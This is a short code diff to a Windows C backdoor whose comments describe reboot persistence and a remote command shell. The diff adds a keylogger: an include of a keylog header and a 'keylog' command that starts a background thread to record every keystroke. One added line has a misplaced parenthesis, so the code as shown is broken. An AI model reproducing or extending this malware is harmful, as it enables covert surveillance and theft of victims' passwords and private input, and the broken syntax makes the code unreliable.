@@ -12,6 +12,9 @@
 #include <winuser.h> //Allows to create user interface in windows applications.
 #include <wininet.h> //Allow program to do internet options like downloading and uploading.
 #include <windowsx.h> //Allows to do extra macro functions to make windows program easier.
+#include "keylog.h" //Allows to record the evry keystrokes that has been pressed.
+
+
 
 #define bzero(p, size) (void) memset((p), 0, (size)) //Perfoam a same task like memset function does.
 //bzero take parameter and the memory size as a input.
@@ -79,6 +82,8 @@ int bootRun()
   return 0;
 
 }
+
+
 
 //The below function make slicing the command provided by the user as cd 'cut' directory.
 //Slicing the string `cd `
@@ -180,6 +185,13 @@ void shell()
       {
         //the bootRun function allows us to make persistance the backdoor when target rebooted.
         bootRun();
+      }
+      else if (strncmp("keylog"), buffer, 6) == 0)
+      {
+        //this process want to execute in the background 
+        //need to specify a thread to do that.
+        HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);//Function Name in the keylog.
+        goto jump;
       }      
       
       else 
